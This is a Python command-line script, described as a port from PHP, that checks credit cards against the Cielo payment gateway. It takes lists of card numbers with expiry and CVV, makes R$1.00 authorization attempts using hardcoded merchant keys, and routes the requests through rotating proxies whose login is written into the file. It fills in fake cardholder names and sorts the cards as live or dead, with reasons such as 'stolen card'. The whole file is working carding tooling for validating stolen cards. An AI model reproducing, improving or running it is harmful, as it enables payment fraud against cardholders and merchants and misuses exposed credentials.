#!/usr/bin/env python3
"""
CHK Full 3.0 - Cielo Gateway Checker
Ported from PHP to Python for GitHub Actions CLI usage
"""
import argparse
import sys
import json
import re
import random
import time
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from colorama import Fore, Style, init

init(autoreset=True)

# ========== CONFIG ==========
WEBHOOK_PROXY = "p.webshare.io:80"
PROXY_USER = "xsoqlhle-rotate"
PROXY_PASS = "h9xxzoo8k4bh"

CIELO_KEYS = [
    {
        "merchant_id": "e25579d7-1ffd-4dcb-a00f-3c87d973c292",
        "merchant_key": "ZBVJHUIPJEIETGLRIAZCKYWQSNQMYMDPRIRKYRNU"
    }
]

PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{WEBHOOK_PROXY}"

# ========== BIN DATABASE ==========
def load_bins(csv_path):
    bins = {}
    try:
        with open(csv_path, 'r', encoding='latin-1') as f:
            reader = csv.reader(f, delimiter=';')
            for row in reader:
                if len(row) >= 6:
                    bin6 = row[0][:6]
                    bins[bin6] = {
                        'bandeira': row[1] if len(row) > 1 else '',
                        'banco': row[2] if len(row) > 2 else '',
                        'level': row[3] if len(row) > 3 else '',
                        'pais': row[4] if len(row) > 4 else '',
                        'pais_code': row[5] if len(row) > 5 else '',
                    }
                    if len(row) > 6:
                        bins[bin6]['link'] = row[6]
                    if len(row) > 7:
                        bins[bin6]['extra'] = row[7]
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao carregar bins.csv: {e}")
    return bins

BINS_DB = load_bins("bins.csv")

# ========== UTILS ==========
def get_fake_person():
    """Gera dados de pessoa fake via 4devs"""
    try:
        r = requests.post(
            "https://www.4devs.com.br/ferramentas_online.php",
            data={
                "acao": "gerar_pessoa",
                "sexo": "I",
                "pontuacao": "S",
                "idade": "0",
                "cep_estado": "PB",
                "txt_qtde": "1",
                "cep_cidade": ""
            },
            headers={
                "host": "www.4devs.com.br",
                "origin": "https://www.4devs.com.br",
                "referer": "https://www.4devs.com.br/gerador_de_pessoas",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            timeout=15,
            proxies={"http": PROXY_URL, "https": PROXY_URL}
        )
        return r.json()[0]['nome']
    except:
        return "João da Silva"

def format_month(mes):
    return f"{int(mes):02d}"

def format_year(ano):
    ano = str(ano)
    if len(ano) == 2:
        return f"20{ano}"
    return ano

def get_bin_info(bin6):
    return BINS_DB.get(bin6[:6], {
        'bandeira': 'DESCONHECIDA',
        'banco': 'DESCONHECIDO',
        'level': 'DESCONHECIDO',
        'pais': 'BR',
        'pais_code': 'BR',
        'link': ''
    })

# ========== CORE CHECK ==========
def check_card(card_line, use_balance=False):
    try:
        parts = re.split(r'[,|»|:|\|]', card_line.strip())
        if len(parts) < 4:
            return {"status": "ERROR", "msg": "Formato inválido (use: card|mes|ano|cvv)"}
        
        card, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        bin6 = card[:6]
        
        bin_info = get_bin_info(bin6)
        bandeira = bin_info['bandeira']
        banco = bin_info['banco']
        level = bin_info['level']
        pais = bin_info['pais']
        pais_code = bin_info['pais_code']
        link = bin_info.get('link', '')
        
        mes = format_month(mes)
        ano = format_year(ano)
        
        nome = get_fake_person()
        
        # Seleciona chave aleatória
        key = random.choice(CIELO_KEYS)
        merchant_id = key['merchant_id']
        merchant_key = key['merchant_key']
        
        payload = {
            "MerchantOrderId": str(random.randint(1000000000, 9999999999)),
            "Payment": {
                "Type": "CreditCard",
                "Amount": "100",  # R$ 1,00
                "Installments": 1,
                "SoftDescriptor": "Juliete 13x14",
                "CreditCard": {
                    "CardNumber": card,
                    "Holder": nome,
                    "ExpirationDate": f"{mes}/{ano}",
                    "SecurityCode": cvv,
                    "Brand": "Elo"
                }
            }
        }
        
        headers = {
            'MerchantId': merchant_id,
            'MerchantKey': merchant_key,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.post(
            "https://api.cieloecommerce.cielo.com.br/1/sales",
            json=payload,
            headers=headers,
            timeout=30,
            proxies={"http": PROXY_URL, "https": PROXY_URL}
        )
        
        if response.status_code != 200:
            return {"status": "ERROR", "msg": f"HTTP {response.status_code}: {response.text[:200]}"}
        
        json_resp = response.json()
        payment = json_resp.get('Payment', {})
        return_code = payment.get('ReturnCode', '')
        return_msg = payment.get('ReturnMessage', '')
        
        # Classifica
        if return_msg == "Transacao autorizada":
            status = "LIVE"
            msg = f"#Live {card} {mes}/{ano} {cvv} - {bandeira} {banco} {level} {pais} ({pais_code}) {link} - ({return_code}) {return_msg}"
        elif return_code in ["GD", "BP171", "N7", "57", "43", "51", "GA"]:
            status = "DIE"
            reason = {
                "GD": "Genérico",
                "BP171": "Cartão inválido",
                "N7": "CVV inválido",
                "57": "Não permitida",
                "43": "Cartão roubado/furtado",
                "51": "Saldo insuficiente",
                "GA": "Referida pela Cielo"
            }.get(return_code, return_msg)
            msg = f"#Reprovada {card} {mes}/{ano} {cvv} - {bandeira} {banco} {level} {pais} ({pais_code}) {link} - ({return_code}) {reason}"
        else:
            status = "DIE"
            msg = f"#Reprovada {card} {mes}/{ano} {cvv} - {bandeira} {banco} {level} {pais} ({pais_code}) {link} - ({return_code}) {return_msg}"
        
        return {"status": status, "msg": msg, "raw": json_resp}
        
    except requests.exceptions.ProxyError:
        return {"status": "ERROR", "msg": "Erro de proxy (Webshare)"}
    except requests.exceptions.Timeout:
        return {"status": "ERROR", "msg": "Timeout na requisição"}
    except Exception as e:
        return {"status": "ERROR", "msg": f"Erro: {str(e)[:100]}"}

# ========== MAIN ==========
def main():
    parser = argparse.ArgumentParser(description="CHK Cielo - GitHub Actions CLI")
    parser.add_argument('-t', '--targets', required=True, help='Arquivo com CCs (um por linha: card|mes|ano|cvv)')
    parser.add_argument('-th', '--threads', type=int, default=10, help='Threads paralelas (padrão: 10)')
    parser.add_argument('-o', '--output', default='results.txt', help='Arquivo de saída')
    parser.add_argument('--saldo', action='store_true', help='Verificar saldo (não implementado)')
    args = parser.parse_args()
    
    with open(args.targets, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]
    
    print(f"{Fore.CYAN}[*] CHK Cielo - Carregados {len(targets)} targets | Threads: {args.threads}")
    print(f"{Fore.YELLOW}[*] Proxy: {WEBHOOK_PROXY} | Chaves Cielo: {len(CIELO_KEYS)}")
    
    live_count = 0
    die_count = 0
    error_count = 0
    results = []
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_target = {executor.submit(check_card, t): t for t in targets}
        
        for future in as_completed(future_to_target):
            target = future_to_target[future]
            try:
                result = future.result()
                status = result['status']
                msg = result['msg']
                
                if status == "LIVE":
                    print(f"{Fore.GREEN}[LIVE] {msg}")
                    live_count += 1
                elif status == "DIE":
                    print(f"{Fore.RED}[DIE]  {msg}")
                    die_count += 1
                else:
                    print(f"{Fore.YELLOW}[ERR]  {target} -> {msg}")
                    error_count += 1
                
                results.append(f"{target} | {status} | {msg}")
                
            except Exception as e:
                print(f"{Fore.RED}[EXC] {target} -> {e}")
                error_count += 1
                results.append(f"{target} | ERROR | {e}")
    
    # Salva resultados
    with open(args.output, 'w') as f:
        f.write('\n'.join(results))
    
    # Summary
    print(f"\n{Fore.CYAN}===== SUMMARY =====")
    print(f"{Fore.GREEN}LIVE:  {live_count}")
    print(f"{Fore.RED}DIE:   {die_count}")
    print(f"{Fore.YELLOW}ERROR: {error_count}")
    print(f"{Fore.WHITE}TOTAL: {len(targets)}")
    print(f"{Fore.CYAN}Resultados salvos em: {args.output}")

if __name__ == '__main__':
    main()
